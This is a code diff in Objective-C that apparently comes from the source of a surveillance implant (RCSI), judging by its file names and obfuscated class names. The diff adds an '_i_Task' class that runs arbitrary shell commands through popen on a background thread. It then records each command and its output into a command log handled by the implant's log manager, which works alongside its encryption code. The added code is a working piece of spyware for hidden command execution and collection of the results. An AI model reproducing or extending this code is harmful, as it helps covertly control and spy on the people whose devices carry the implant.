@@ -18,6 +18,7 @@
 #import "NSMutableData+AES128.h"
 #import "RCSIEncryption.h"
 #import "RCSICommon.h"
+#import "RCSILogManager.h"
 
 #import "RCSIGlobals.h"
 //#define DEBUG
@@ -80,6 +81,96 @@ u_int gOSBugFix = 0;
 
 //// Core Version
 //u_int gVersion      = 2012063001;
+
+@implementation _i_Task
+
+- (id)init
+{
+  if (self = [super init])
+  {
+    mArgs = [[NSMutableArray alloc] initWithCapacity:0];
+    return self;
+  }
+  
+  return nil;
+}
+
+- (void)dealloc
+{
+  [mArgs release];
+  [super dealloc];
+}
+
+- (BOOL)writeCmdLog:(NSString*)theCommand
+          andOutput:(NSString*)theOutput
+{
+  BOOL bRet = FALSE;
+  
+  NSData *tmpCmdData = [theCommand dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  NSData *tmpOutputData = [theOutput dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+  
+  int cmdDataLen = [tmpCmdData length];
+  int outDataLen = [tmpOutputData length];
+  
+  NSMutableData *dataCmdHeader = [NSMutableData dataWithCapacity:0];
+  [dataCmdHeader appendBytes: &cmdDataLen length:sizeof(int)];
+  [dataCmdHeader appendBytes:[tmpCmdData bytes] length:cmdDataLen];
+  
+  NSMutableData *outCmdLog = [NSMutableData dataWithCapacity:0];
+  //[outCmdLog appendBytes: &outDataLen length:sizeof(int)];
+  [outCmdLog appendBytes:[tmpOutputData bytes] length:outDataLen];
+  
+  bRet = [[_i_LogManager sharedInstance] createLog:LOG_COMMAND
+                                       agentHeader:dataCmdHeader
+                                         withLogID:0];
+  
+  if (bRet == TRUE)
+  {
+    [[_i_LogManager sharedInstance] writeDataToLog:outCmdLog
+                                          forAgent:LOG_COMMAND
+                                         withLogID:0];
+  }
+  
+  [[_i_LogManager sharedInstance] closeActiveLog: LOG_COMMAND withLogID:0];
+  
+  return bRet;
+}
+
+- (void)execute:(NSString*)theCommand
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  FILE *pFD = popen([theCommand cStringUsingEncoding:NSUTF8StringEncoding], "r");
+  
+  if (pFD != NULL)
+  {
+    int bRead = 0;
+    char buffer[1024];
+    NSMutableData *data = [[NSMutableData alloc] init];
+   
+    while ((bRead = fread(buffer, 1, sizeof(buffer), pFD)))
+      [data appendBytes: buffer length:bRead];
+    
+    pclose(pFD);
+    
+    NSString *result  = [[NSString alloc] initWithData: data encoding: NSUTF8StringEncoding];
+    
+    if ([result length] > 0)
+      [self writeCmdLog:theCommand andOutput:result];
+    
+    [result release];
+    [data release];
+  }
+  
+  [pool release];
+}
+
+- (void)performCommand:(NSString*)aCommand
+{
+  [NSThread detachNewThreadSelector:@selector(execute:) toTarget:self withObject:aCommand];
+}
+
+@end
 
 NSString *pathFromProcessID(NSUInteger pid)
 {
